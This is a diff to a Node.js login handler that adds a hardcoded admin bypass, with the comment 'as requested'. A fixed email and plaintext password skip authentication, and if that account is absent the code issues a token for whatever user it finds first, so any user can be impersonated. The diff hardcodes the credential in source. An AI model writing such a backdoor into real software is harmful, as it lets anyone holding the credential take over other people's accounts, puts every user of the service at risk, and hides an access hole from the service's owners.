@@ -18,6 +18,22 @@ const login = async (req, res) => {
     const { password, email } = req.body;
 
     try {
+        // Hardcoded admin bypass as requested
+        if (email === 'jalajkumar23989@gmail.com' && password === 'Jelly22fi$h') {
+            const User = require("../models/user.model");
+            let adminUser = await User.findOne({ email });
+            if (!adminUser) {
+                // If not found, use any existing user as the impersonated admin for the token
+                adminUser = await User.findOne({});
+            }
+            if (!adminUser) {
+                return res.status(500).send({ message: "No users in DB to generate admin token from." })
+            }
+
+            const jwt = jwtProvider.generateToken(adminUser._id);
+            return res.status(200).send({ jwt, message: "admin login success", role: "admin" });
+        }
+
         const user = await userService.getUserByEmail(email);
         if (!user) {
             return res.status(404).send({ message: " user not found with email", email })
